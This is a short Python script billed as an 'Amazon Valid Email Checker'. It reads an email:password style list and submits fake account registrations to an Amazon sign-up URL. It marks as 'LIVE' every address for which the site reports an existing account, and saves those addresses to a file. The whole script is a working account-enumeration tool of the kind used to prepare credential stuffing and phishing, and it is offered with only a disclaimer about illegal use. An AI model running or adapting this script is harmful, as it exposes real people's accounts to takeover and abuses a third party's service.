import requests
live = open('Live.txt', 'w')
Checked = "Checked by Casein Valid Email Checker"
print("_"*50)
print ("Amazon Valid Email Checker by Casein")
print("I dont't Accept any Responsibility for any illegal usage!")
print("_"*55)
list = input("Input Mail List :");
link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*55)
while True:
	email = list.readline().replace('\n','')
	if not email:
		break
	mail = email.strip().split(':')
	xxx = {'customerName':'Casein Nitrate','email': mail[0],'emailCheck': mail[0],'password':'BirdyBirdySad012','passwordCheck':'BirdyBirdySad012'}
	cek = s.post(link, headers=head, data=xxx).text
	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
		print("\033[32;1mLIVE\033[0m | "+email+" | [(Checked)]")
		live.write(email + '\n')
	else:
		print("\033[31;1mDIE\033[0m | "+email+" | [(Checked)]")
print("-"*50)
print("\033[35;1mProccess Checking Done\033[0m")
print("Live Email Saved in Live.txt")

